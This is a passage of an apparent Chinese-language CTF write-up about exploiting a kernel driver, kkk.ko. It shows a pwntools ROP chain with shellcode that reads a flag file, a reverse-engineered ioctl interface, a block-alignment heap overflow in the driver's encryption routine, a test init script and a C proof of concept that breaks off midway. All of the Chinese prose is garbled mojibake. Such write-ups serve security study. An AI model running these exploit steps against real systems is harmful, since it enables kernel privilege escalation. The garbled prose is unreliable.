<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">&amp;</span><span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">),</span>
        <span class="mh">0x000000000045c139</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
        <span class="mh">0x00000000004005af</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
        <span class="mh">0x00000000004859c5</span><span class="p">)</span>

<span class="c1"># read(0, buf, 0x100)</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="mh">0x000000000045c139</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span>
        <span class="mh">0x00000000004005af</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
        <span class="mh">0x00000000004859c5</span><span class="p">)</span>

<span class="c1"># ret2shellcode</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>

<span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x848</span> <span class="o">+</span> <span class="n">rop</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>



<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>

<span class="c1"># 0x7ffdbdb52b80</span>
<span class="c1"># return at 0x7ffdbdb533c8</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><h2 id="step2">step2</h2>
<p>åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæˆ‘ä»¬å®ç°äº†ä»»æ„ä»£ç æ‰§è¡Œï¼Œå¯ä»¥å’Œ kkk.ko é©±åŠ¨éšæ„äº¤äº’ã€‚åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†æ”»ç ´å†…æ ¸æ€é©±åŠ¨ï¼Œæ‹¿åˆ° root æƒé™ã€‚</p>
<h3 id="é©±åŠ¨é€†å‘">é©±åŠ¨é€†å‘</h3>
<p>å¯¹ç€ kkk.ko çœ‹ï¼Œå¯ä»¥æ˜ç¡®åè®®çš„æ›´å¤šåŸŸï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>
<p><code>segment[1]</code> æ˜¯ enc</p>
</li>
<li>
<p><code>segment[2]</code> æ˜¯ kkk_typeï¼Œenum å‹ï¼Œæ ‡è¯†äº† kkk.ko å¤„ç†çš„åŠ å¯†æ–¹æ¡ˆã€‚</p>
</li>
</ul>
<p>ä½†å†å»çœ‹è¿™ä¸ªåè®®å¹¶æ²¡æœ‰å¤šå°‘æ„ä¹‰ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»å¯ä»¥ç›´æ¥ç”¨ <code>ioctl</code> å»å’Œé©±åŠ¨äº¤äº’äº†ã€‚æœ‰ä»¥ä¸‹è¿™äº›äº¤äº’é€‰é¡¹</p>
<h4 id="open">open</h4>
<p>åˆå§‹åŒ–ï¼ŒæŠŠ filep çš„ private_data èµ‹å€¼æˆè‡ªå»ºçš„ç»“æ„ä½“ <code>kkk_desc</code>ï¼Œè¿™ä¸ªç»“æ„ä½“é‡Œæœ‰ä¸ª <code>kkk_obj</code> æŒ‡é’ˆæ•°ç»„</p>
<h4 id="close">close</h4>
<p>é€€å‡ºï¼Œé‡Šæ”¾ã€æ¸…é›¶æŒ‡é’ˆã€‚</p>
<h4 id="0x6b64-add">0x6B64 add</h4>
<p>è¿™é‡Œ <code>add</code> é€å…¥çš„å‚æ•° con æ˜¯ä»¥ç»“æ„ä½“ <code>kkk_ioctl_add_arg</code> å½¢å¼ï¼Œæœ‰å¦‚ä¸‹åŸŸ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">kkk_ioctl_add_arg</span>
<span class="p">{</span>
    <span class="k">enum</span> <span class="n">kkk_type</span> <span class="n">type</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>

<span class="cm">/* core data strcutres */</span>
<span class="k">struct</span> <span class="n">kkk_pack</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> <span class="c1">// user space pointer
</span><span class="c1"></span><span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>åœ¨ <code>add</code> æ“ä½œä¸­ï¼Œä¼šæ‰¾åˆ° filep çš„ private_dataï¼Œé€‰æœ€å° idx çš„ <code>kkk_obj</code> æŒ‡é’ˆæ•°ç»„æ¥åˆ†é…ã€‚åˆ†é…æ–¹å¼å¾ˆç®€å•ï¼Œä¸ºè¯¥æŒ‡é’ˆåˆ†é… <code>kkk_obj</code> ç»“æ„ä½“å¤§å°åŠ ä¸Š <code>keypack-&gt;size</code> ä¸ <code>datapack-&gt;size</code> å¤§å°çš„ç©ºé—´ã€‚ä»¥å‚æ•° con å„ä¸ªåŸŸæ¥å¡«å……è¯¥  <code>kkk_obj</code> ç»“æ„ä½“ï¼ŒåŒæ—¶ä¼šæŠŠ <code>keypack-&gt;ptr</code> ä¸ <code>datapack-&gt;ptr</code> å…·ä½“å†…å®¹æ‹·è´åˆ°åæ–¹åŒºåŸŸã€‚å…¶ä¸­ <code>handler</code> æ˜¯ <code>type</code> æŒ‡å®šçš„åŠ å¯†ç®—æ³•çš„å‡½æ•°æŒ‡é’ˆã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">kkk_obj</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">keypack</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">datapack</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">handler</span><span class="p">)(</span><span class="k">struct</span> <span class="n">kkk_obj</span> <span class="o">*</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="0x6b67-update">0x6B67 update</h4>
<p><code>update</code> é€å…¥å‚æ•° con æ˜¯ä»¥ç»“æ„ä½“ <code>kkk_ioctl_other_arg</code> å½¢å¼ï¼Œæœ‰å¦‚ä¸‹åŸŸ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">kkk_ioctl_other_arg</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>åœ¨ <code>update</code> æ“ä½œä¸­ï¼Œä¼šæ ¹æ® con çš„å†…å®¹ä¿®æ”¹ <code>kkk_obj[id]</code> å¯¹åº”çš„ <code>keypack-&gt;ptr</code> ä¸ <code>datapack-&gt;ptr</code> å†…å®¹ï¼ˆä¸èƒ½æ”¹ sizeï¼‰ã€‚</p>
<h4 id="0x6b69-dump">0x6B69 dump</h4>
<p><code>dump</code> é€å…¥å‚æ•° con ä¹Ÿæ˜¯ä»¥ç»“æ„ä½“ <code>kkk_ioctl_other_arg</code> å½¢å¼ã€‚å®ƒä¼šå°† <code>kkk_obj[id]</code> å¯¹åº”çš„ <code>keypack-&gt;ptr</code> ä¸ <code>datapack-&gt;ptr</code> å†…å®¹è¦†ç›–åˆ° con çš„ <code>keypack-&gt;ptr</code> ä¸ <code>datapack-&gt;ptr</code> æŒ‡é’ˆæ‰€æŒ‡å†…å®¹ä¸­ã€‚ï¼ˆsize åŸŸåŒæ ·æ— æ•ˆï¼‰</p>
<h4 id="0x6b6b-launch">0x6B6B launch</h4>
<p>ä¼ å…¥å‚æ•°åŒæ ·æ˜¯ä»¥ç»“æ„ä½“ <code>kkk_ioctl_other_arg</code> å½¢å¼ã€‚ä¼šæ‰§è¡Œ <code>kkk_obj[id]-&gt;handler(kkk_obj[id])</code></p>
<h4 id="0x6b6d-detach">0x6B6D detach</h4>
<p>å‚æ•°åŒæ ·æ˜¯ä»¥ç»“æ„ä½“ <code>kkk_ioctl_other_arg</code> å½¢å¼ã€‚ä¼š <code>kfree(kkk_obj[id])</code> å¹¶æ¸…é›¶æŒ‡é’ˆã€‚</p>
<h3 id="åŠ å¯†å‡½æ•°">åŠ å¯†å‡½æ•°</h3>
<p>ä¸Šè¿°äº¤äº’çœ‹ä¸Šå»å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œ<code>detach</code> é‡Œæ²¡æœ‰ uafï¼Œ<code>update</code> å’Œ <code>dump</code> å› ä¸º size åŸŸæ ¹æœ¬æ— æ•ˆæ‰€ä»¥ä¹Ÿæ²¡æœ‰è¶Šç•Œã€‚æ‰€ä»¥æ¥æ¥ç€çœ‹çœ‹ <code>handler</code> æŒ‡å‘çš„å„ä¸ªåŠ å¯†å‡½æ•°ã€‚å…·ä½“æ¥è¯´ï¼Œ<code>handler</code> æ˜¯æ ¹æ® <code>type</code> å¦‚ä¸‹èµ‹å€¼çš„ï¼Œå¯è§ä¸€å…±æœ‰ 4 ä¸­åŠ å¯†æ–¹å¼ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">// add åŠŸèƒ½ä¸­
handler = handlers[type &amp; 3];

.data:00000000000011E0 handlers        dq offset kkk_des_cb    ; DATA XREF: kkk_unlocked_ioctl+1E0â†‘r
.data:00000000000011E8                 dq offset kkk_tdes_cb
.data:00000000000011F0                 dq offset kkk_aes128_cb
.data:00000000000011F8                 dq offset kkk_aes256_cb
</code></pre></td></tr></table>
</div>
</div><p>è¿™ 4 ç§åŠ å¯†å‡½æ•°åšçš„äº‹éƒ½æ˜¯æŠŠ <code>obj-&gt;keypack.ptr</code> çš„å‰å…«ä¸ªå­—èŠ‚ä½œä¸º key å»è¿›è¡ŒåŠ å¯† <code>obj-&gt;datapack.ptr</code> ï¼Œä¼šè°ƒç”¨å‡½æ•° <code>enc_dec_internal</code> ï¼Œå…¶ä¸­ <code>size</code> ç”± <code>obj-&gt;datapack.size</code> æŒ‡å®šã€‚å¯ä»¥çœ‹åˆ°å®ƒçš„æ“ä½œæ˜¯æŒ‰ <code>blocksize</code> å»é€å—åŠ å¯†ï¼Œä½†æˆ‘ä»¬æ³¨æ„åˆ°å®ƒå¹¶æ²¡æœ‰è¿›è¡Œå¯¹é½æ“ä½œã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span>
<span class="nf">enc_dec_internal</span><span class="p">(</span><span class="k">struct</span> <span class="n">crypto_cipher</span> <span class="o">*</span><span class="n">tfm</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span>
                 <span class="kt">char</span> <span class="o">*</span><span class="n">block1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">block2</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">blocksize</span><span class="p">,</span> <span class="kt">int</span> <span class="n">enc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">blocksize</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">blocksize</span><span class="p">);</span>
        <span class="cm">/* code */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">enc</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">crypto_cipher_encrypt_one</span><span class="p">(</span><span class="n">tfm</span><span class="p">,</span> <span class="n">block2</span><span class="p">,</span> <span class="n">block1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">crypto_cipher_decrypt_one</span><span class="p">(</span><span class="n">tfm</span><span class="p">,</span> <span class="n">block2</span><span class="p">,</span> <span class="n">block1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">block2</span><span class="p">,</span> <span class="n">blocksize</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>æ¼æ´å°±å‡ºç°åœ¨è¿™é‡Œã€‚ <code>kkk_aes256_cb</code> å’Œ <code>kkk_aes128_cb</code> ä¸­ï¼Œè¿™ä¸¤ä¸ªåŠ å¯†å‡½æ•°æŒ‡å®šçš„ <code>blocksize</code> å‡ä¸º 16ï¼Œä½†æ˜¯ç”±äº <code>obj-&gt;datapack.size</code> å¹¶æ²¡æœ‰åš 16 å­—èŠ‚å¯¹é½æ“ä½œï¼Œå°†å¯èƒ½å¯¼è‡´å†…æ ¸å †æº¢å‡ºã€‚<code>kkk_des_cb</code> ä¸ <code>kkk_tdes_cb</code> ä¹ŸåŒç†ï¼Œå®ƒä¹Ÿæ²¡æœ‰ä¿è¯å…¶ 8 å­—èŠ‚å¯¹é½ã€‚</p>
<h3 id="æµ‹è¯•">æµ‹è¯•</h3>
<p>å°è¯•ä¿®æ”¹ kernel å¯åŠ¨çš„ init è„šæœ¬ï¼Œå¯¹ kkk.ko å•ç‹¬è¿›è¡Œæµ‹è¯•ã€‚å°† <code>/parser</code> å¯åŠ¨å‘½ä»¤æ”¹æˆ <code>/bin/sh</code> å³å¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
mkdir tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs none /tmp

<span class="nb">exec</span> 0&lt;/dev/console
<span class="nb">exec</span> 1&gt;/dev/console
<span class="nb">exec</span> 2&gt;/dev/console

<span class="nb">echo</span> -e <span class="s2">&#34;Boot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds&#34;</span>

insmod /kkk.ko
chmod <span class="m">666</span> /dev/kkk
chmod <span class="m">740</span> /flag
<span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict
<span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict
chmod <span class="m">400</span> /proc/kallsyms

poweroff -d <span class="m">600</span> -f <span class="p">&amp;</span>



<span class="c1"># setsid /bin/cttyhack setuidgid 1000 /parser</span>
setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d <span class="m">0</span>  -f
</code></pre></td></tr></table>
</div>
</div><p>å †æº¢å‡º PoC å¦‚ä¸‹ï¼Œå°†å®ƒé™æ€ç¼–è¯‘æ”¾å…¥æ–‡ä»¶ç³»ç»Ÿå³å¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">struct</span> <span class="n">AddParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">type</span><span class="p">;</span> <span class="c1">// type and enc
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>   
<span class="p">};</span>

<span class="k">struct</span> <span class="n">OtherParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>     
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">Add</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">AddParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Add return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B64</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Launch return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6B</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Detach</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6D</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/dev/kkk&#34;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] open wrong, exit&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">AddParam</span> <span class="n">a</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">OtherParam</span> <span class="n">r</span><span class="p">;</span>

    <span class="c1">// malloc 192 - 48 = 144 = 0x90
</span><span class="c1"></span>
    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x7F</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="c1">// memset(buf, 0x43, 8);
</span><span class="c1"></span>    <span class="c1">// Add(fd, &amp;a);
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
